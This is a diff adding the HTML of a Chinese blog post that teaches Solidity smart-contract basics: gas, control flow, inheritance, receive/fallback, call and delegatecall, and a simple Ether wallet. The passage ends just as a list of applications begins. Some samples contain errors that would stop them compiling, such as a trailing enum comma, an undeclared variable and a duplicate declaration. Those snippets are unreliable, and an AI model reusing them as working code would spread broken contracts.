@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>智能合约一日通——Solidity篇 | Z.Y. ☯ Cosmos</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="比特币是中本聪（未必是个体，可能是一群人，人人都可能是中本聪）送给全世界的礼物，在过去的历史经验中，我们看到了其叹为观止的金融属性，但是作为一种创新我们除了看到其金融性质外，还有很多熟悉的事物值得被重新定义，从而探索出新的价值。就比如说：信任和验证。这也带来了在区块链上部署去中心可计算合约的可能性：Smart Contract。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约一日通——Solidity篇">
+<meta property="og:url" content="https://izhen.me/2022/05/15/2022_solidity/index.html">
+<meta property="og:site_name" content="Z.Y. ☯ Cosmos">
+<meta property="og:description" content="比特币是中本聪（未必是个体，可能是一群人，人人都可能是中本聪）送给全世界的礼物，在过去的历史经验中，我们看到了其叹为观止的金融属性，但是作为一种创新我们除了看到其金融性质外，还有很多熟悉的事物值得被重新定义，从而探索出新的价值。就比如说：信任和验证。这也带来了在区块链上部署去中心可计算合约的可能性：Smart Contract。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-05-15T12:53:47.000Z">
+<meta property="article:modified_time" content="2022-05-16T07:49:40.625Z">
+<meta property="article:author" content="Zhen Yi">
+<meta property="article:tag" content="web 3.0">
+<meta property="article:tag" content="Smart Contract">
+<meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="ERC721">
+<meta property="article:tag" content="ERC20">
+<meta property="article:tag" content="vault">
+<meta property="article:tag" content="x070">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:creator" content="@soczhenyi">
+  
+    <link rel="alternate" href="/atom.xml" title="Z.Y. ☯ Cosmos" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Z.Y. ☯ Cosmos</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Powered by Disqus, scientific surfing for access</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" target="_blank" rel="noopener" href="http://sweetpotato.ai">λ</a>
+        
+          <a class="main-nav-link" href="/lab">About</a>
+        
+          <a class="main-nav-link" target="_blank" rel="noopener" href="https://resume.izhen.me">Resume</a>
+        
+          <a class="main-nav-link" target="_blank" rel="noopener" href="https://github.com/i-zhen">Github</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://izhen.me"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2022_solidity" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/05/15/2022_solidity/" class="article-date">
+  <time class="dt-published" datetime="2022-05-15T12:53:47.000Z" itemprop="datePublished">2022-05-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/BLOG/">BLOG</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      智能合约一日通——Solidity篇
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>比特币是中本聪（未必是个体，可能是一群人，人人都可能是中本聪）送给全世界的礼物，在过去的历史经验中，我们看到了其叹为观止的金融属性，但是作为一种创新我们除了看到其金融性质外，还有很多熟悉的事物值得被重新定义，从而探索出新的价值。就比如说：信任和验证。这也带来了在区块链上部署去中心可计算合约的可能性：Smart Contract。</p>
+<span id="more"></span>
+
+<p>智能合约是<a target="_blank" rel="noopener" href="https://www.ibm.com/cn-zh/topics/smart-contracts">什么</a>？简单说就是区块链内的用户实现的协议，一个智能合约可以包含一组函数，可以与其它的合约交互、投票、存储资料以及传送<code>Crypto</code>等。智能合约通常要满足可验证和合约内条款可以被执行。实际上，正因为依托于区块链技术，智能合约可以在没有第三方的情况下进行可信交易，交易可追踪，不可逆。因为区块链的固有性质，智能合约DApp的开发与过往传统App开发在体验上存在较为明显的不同，这里我尝试用尽量短的篇幅给出一个可快速上手的教程。</p>
+<h3 id="从Hello-World开始"><a href="#从Hello-World开始" class="headerlink" title="从Hello World开始"></a>从Hello World开始</h3><p>现有的智能合约编程语言包括了<a href="">Solidity</a>， <a href="">Vyper</a> 还有 <a href="">Rust</a>，这里我们选用<code>Solidity</code>，一种最常用的智能合约编程语言，其语法特征比较接近于<code>Java</code>，<code>JavaScript</code>和<code>C++</code>三者的混合体。这里给出一个例子：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;  <span class="comment">// pargma声明Solidity编译器的版本</span></span><br><span class="line"></span><br><span class="line">contract HelloWorld &#123;</span><br><span class="line">    string public greet = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的智能合约，声明了编译器的版本，定义了一个智能合约。合约内部声明了一个变量，这种变量也叫做<code>state</code>变量，可存储信息于以太坊网络中，并需要支付一定的<a href="">gas fee</a>费用。我们在试图创建智能合约的时候，在满足自身需求的前提下，还要重点考虑到部署成本和安全这两个问题。因为区块链的不可更改的性质，智能合约的升级与重新部署基本不能用传统的手段去实施，类似的出现了漏洞的补救也十分棘手，这就给我们的区块链编程模型带来很大挑战。以下几个方面值得关注：</p>
+<ol>
+<li>区块链基础设施不健全：无论是<code>web2</code>的云基础设施，还是开发工具链都尚处于萌芽阶段，<code>PaaS</code>和<code>IaaS</code>相关门类的服务比较少</li>
+<li>区块链DApp开发不能用<code>web2</code>时代小步快跑的模式，而需要一步到位。迭代模式和中心化互联网应用有本质不同</li>
+<li>中心化web应用的运行和部署成本由项目方全部承担，用户不会直接参与这个环节；DApp则由项目方和用户共同承担，合约的部署和执行的费用明码标价(gas fee)</li>
+<li>中心化时代，应用的执行是在无数个<strong>独立</strong>的计算机上完成的；去中心时代，反而要把区块链网络看成是<strong>一个</strong>大的计算机</li>
+<li>去中心时代对可信的要求是刚需，开发者不能像云时代一样很轻松的将相当的安全需求依赖于云服务提供商，但是随着工具链的进步（比如新一代数据分析引擎），可能可以得到缓解</li>
+</ol>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="Gas"><a href="#Gas" class="headerlink" title="Gas"></a>Gas</h4><p>区块链的运营也有成本，在<code>web2</code>时代，运营成本被中心化服务商直接承担或分出一部分让广告商亦或用户间接承担，在使用很多耳熟能详的App时，用户不承担服务成本。在<code>web3</code>时代，这个成本与用户直接的距离被拉进，既有本身传播账本的消耗，也存在防范<code>DDOS</code>攻击的理由。</p>
+<p>通常，<code>Gas</code>是一个计算单元，在一次智能合约事物中的总花费就是<code>gas fee</code>，这个出价是波动的，出价高的会被优先加载到区块中。一般资源越挤兑，<code>gas fee</code>越高，反之价格越亲民，降低<code>gas fee</code>是推广区块链技术的重要话题。</p>
+<p>对于开发者而言，写出低<code>gas</code>消耗的合约也需要我们认真研习合约和合约语言的特性并付诸实践、持续积累。</p>
+<h3 id="变量与基本控制流"><a href="#变量与基本控制流" class="headerlink" title="变量与基本控制流"></a>变量与基本控制流</h3><p><code>Solidity</code>是一个静态强类型语言，含有基本的数据类型，我们编写智能合约的核心是围绕<code>address</code>这个数据类型来的，地址也就是区块链地址，他是在合约部署前后（可前可后）由椭圆曲线函数和两步哈希生成的一串40位长的数字。它代表了区块链上的一个点，这个点就指向了这个合约本身。根据不同的需要这个点可以指向钱包合约、拍卖合约、token合约、NFT合约等等。</p>
+<p>变量可以有不同的数据类型，也包含不同的变量类型：</p>
+<ol>
+<li>state变量：这是一种存储于区块链上的变量，可以用来记录状态，这种类型是变量是持久化的</li>
+<li>local变量：这是在函数体内部的临时变量，存储于内存中，当合约执行结束后，即刻被销毁</li>
+<li>global变量：这是区块信息的变量，主要有<code>msg</code>和<code>block</code>两个最为常用，区块的传递，支付和时间戳等信息都在其中</li>
+</ol>
+<p>下面简单介绍一下核心语法：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">contract ControlFlow &#123;</span><br><span class="line">    event Log(string message, uint val); <span class="comment">// event是一种在链上存储信息而不用state变量的方法，是一种更经济的持久化方式</span></span><br><span class="line">    uint[] public arr;  <span class="comment">// 数组</span></span><br><span class="line">    struct MyStruct &#123;   <span class="comment">// 结构体</span></span><br><span class="line">        uint foo;</span><br><span class="line">        string text;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> MyStruct) public myStructs; <span class="comment">// Mapping</span></span><br><span class="line">    enum Status &#123;       <span class="comment">// 枚举</span></span><br><span class="line">        None,</span><br><span class="line">        Pending,</span><br><span class="line">        Shipped,</span><br><span class="line">    &#125;</span><br><span class="line">    Status public status;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">examples</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        arr.push(<span class="number">1</span>);                          <span class="comment">// 含有push pop等操作</span></span><br><span class="line">        <span class="keyword">delete</span> arr[<span class="number">0</span>];                        <span class="comment">// 与arr[0] = 0; 等价</span></span><br><span class="line">        status = Status.Shipped;</span><br><span class="line">        uint[] memory memArr = <span class="keyword">new</span> uint[](<span class="number">3</span>); <span class="comment">// 内存中创建临时数组</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ifElse</span>(<span class="params">uint _x</span>) <span class="title">external</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 基本的if-else控制流</span></span><br><span class="line">        <span class="keyword">if</span> (_x &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_x &lt; <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ternaryOperator</span>(<span class="params">uint _x</span>) <span class="title">external</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ?表达式</span></span><br><span class="line">        <span class="keyword">return</span> _x &gt; <span class="number">1</span> ? <span class="number">10</span> : <span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loop</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">pure</span> </span>&#123;</span><br><span class="line">        <span class="comment">// for循环结构，和C++语法一致</span></span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// while循环</span></span><br><span class="line">        uint j;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 入参可以用calldata修饰，这是一种节约gas fee的方式，和memory类似但不可变更</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">address _addr, string calldata _text</span>) <span class="title">external</span> <span class="title">returns</span>(<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        MyStruct storage myStruct = myStructs[_addr];  <span class="comment">// 注意：Solidity的map不可以迭代</span></span><br><span class="line">        myStruct.text = _text;</span><br><span class="line">        <span class="keyword">return</span> _text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要是<code>if</code>和循环语句构成控制流基本操作，数组、Map、枚举、结构体和常规语言一致，稍微需要注意<code>Sodility</code>的delete不是真的删除，数组长度不会变；与常规语言不同的点：</p>
+<ol>
+<li>external：只允许外部合约调用</li>
+<li>internal： 只允许合约内部或者子合约调用</li>
+<li>private：只能合约内部调用</li>
+<li>public：谁都可以调用</li>
+<li>pure：没有state变量</li>
+<li>view：有state变量</li>
+<li>calldata：一种比较节约gas fee的传参声明，类似memory但不可变</li>
+<li>memory：临时变量，存储于内存当中，通常是在函数调用时用到</li>
+<li>storage：state变量，存储于区块链上</li>
+</ol>
+<h3 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h3><p>Solidity是一种支持多继承的多态模型，可被<code>override</code>的函数要在父合约中用<code>virtual</code>标注，继承使用<code>is</code>关键字。父合约的构造函数的调用和<code>C++</code>基本无二，调用父合约的函数则存在<code>super</code>和直接调用两种方式。如果熟悉面向对象编程的话，那么<code>Solidity</code>对于OO的支持与常见语言大差不差，但是多继承本身存在很多问题，也容易造成可维护性的下降，通常情况下建议优先使用接口加单继承的设计模式：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./OtherContract.sol&quot;</span>;  <span class="comment">// 加载其它合约</span></span><br><span class="line"></span><br><span class="line">interface Interface &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inc</span>(<span class="params"></span>) <span class="title">external</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dec</span>(<span class="params"></span>) <span class="title">external</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract X &#123;</span><br><span class="line">    string private s;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">string memory _s</span>)</span> &#123;</span><br><span class="line">        s = _s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">virtual</span> <span class="title">returns</span> (<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;X&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">virtual</span> <span class="title">returns</span> (<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;X&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">address _addr</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        Interface(_addr).dec(); <span class="comment">// 调用接口的语法</span></span><br><span class="line">        TestContract test = TestContract(_addr); <span class="comment">// 声明合约实例</span></span><br><span class="line">        test.foo(); <span class="comment">// 调用其它合约的函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Y is <span class="function"><span class="title">X</span>(<span class="params"><span class="string">&quot;X&quot;</span></span>)</span> &#123; <span class="comment">// 调用父合约的构造器</span></span><br><span class="line">    <span class="comment">// 重载foo()</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">virtual</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Y&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">virtual</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Y&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承的顺序很重要，要按照优先级排列，从&quot;most base-like&quot;到&quot;most derived&quot;</span></span><br><span class="line">contract Z is X, Y &#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">string memory _s</span>) <span class="title">X</span>(<span class="params">_s</span>) &#123;&#125; <span class="comment">// 调用父合约的构造器</span></span><br><span class="line">    <span class="comment">// 重载foo()</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">override</span>(<span class="params">X, Y</span>) <span class="title">returns</span> (<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// super或者直接调用父合约函数</span></span><br><span class="line">        <span class="built_in">super</span>.foo(); </span><br><span class="line">        Y.foo();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Z&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">virtual</span> <span class="title">override</span>(<span class="params">X, Y</span>) <span class="title">returns</span> (<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Z&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="接收Ether"><a href="#接收Ether" class="headerlink" title="接收Ether"></a>接收Ether</h3><p>需要实现<code>recieve</code>和<code>fallback</code>两个函数，同时可以接收和发送Ether的函数要用<code>payable</code>修饰。这两个函数的特性如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Fallback &#123;</span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如何区分谁会被调用？</span></span><br><span class="line"><span class="comment">    Ether 发送到某个Contract</span></span><br><span class="line"><span class="comment">               |</span></span><br><span class="line"><span class="comment">         msg.data 为空?</span></span><br><span class="line"><span class="comment">              / \</span></span><br><span class="line"><span class="comment">            yes  no</span></span><br><span class="line"><span class="comment">            /      \</span></span><br><span class="line"><span class="comment">receive() 已经定义?  fallback()</span></span><br><span class="line"><span class="comment">         /   \</span></span><br><span class="line"><span class="comment">        yes   no</span></span><br><span class="line"><span class="comment">        /      \</span></span><br><span class="line"><span class="comment">  receive()   fallback()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Low-level调用"><a href="#Low-level调用" class="headerlink" title="Low-level调用"></a>Low-level调用</h3><p>有两种低级调用，使得我们可以在不知道合约源码的情况下进行函数调用。一种叫<code>call</code>，有时我们也用<code>call</code>进行相对安全的转账；另一种叫做<code>delegate call</code>，这种调用要求caller和callee对应的合约的存储结构一致，也就是两个合约的<code>field</code>一模一样。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.13</span>;</span><br><span class="line"></span><br><span class="line">contract TestCall &#123;</span><br><span class="line">    <span class="comment">// Storage layout 必须一致才能进行delegate call</span></span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">uint _x, bool _b</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        barWasCalled = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setNum</span>(<span class="params">uint _num</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        num = _num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Call &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callBar</span>(<span class="params">address _addr</span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使用函数签名来操作其它合约</span></span><br><span class="line">        (bool f, bytes memory b) = _addr.call(abi.encodeWithSignature(<span class="string">&quot;bar(uint256,bool)&quot;</span>, <span class="number">1</span>, <span class="literal">false</span>));</span><br><span class="line">        <span class="comment">// 下述调用同时发起以太转账</span></span><br><span class="line">        (bool f, bytes memory b) = _addr.call&#123;</span><br><span class="line">            <span class="attr">value</span>: msg.value,</span><br><span class="line">            <span class="attr">gas</span>: <span class="number">5000</span></span><br><span class="line">        &#125;(abi.encodeWithSignature(<span class="string">&quot;bar(uint256,bool)&quot;</span>, <span class="number">1</span>, <span class="literal">false</span>));</span><br><span class="line">        <span class="built_in">require</span>(f, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DelegateCall &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setNum</span>(<span class="params">address _test, uint _num</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        (bool success, bytes memory data) = _test.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(<span class="string">&quot;setNum(uint256)&quot;</span>, _num)</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="支付与钱包应用"><a href="#支付与钱包应用" class="headerlink" title="支付与钱包应用"></a>支付与钱包应用</h3><p>下述代码是一个简单的以太坊钱包的例子，合约可以接收Ether，已经只能被owner取出（withdraw）自己的以太：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract EtherWallet &#123;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        owner = payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner, <span class="string">&quot;Not owner&quot;</span>);</span><br><span class="line">        (bool sent, ) = owner.call&#123;<span class="attr">value</span>: _amount&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(sent, <span class="string">&quot;failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="主要应用"><a href="#主要应用" class="headerlink" title="主要应用"></a>主要应用</h3><p><a href="">Solidity by Example</a>建议通读，很多例子都非常不错，清晰易懂，这里挑选出一些比较重要的例子，建议精读：</p>
+<ol>
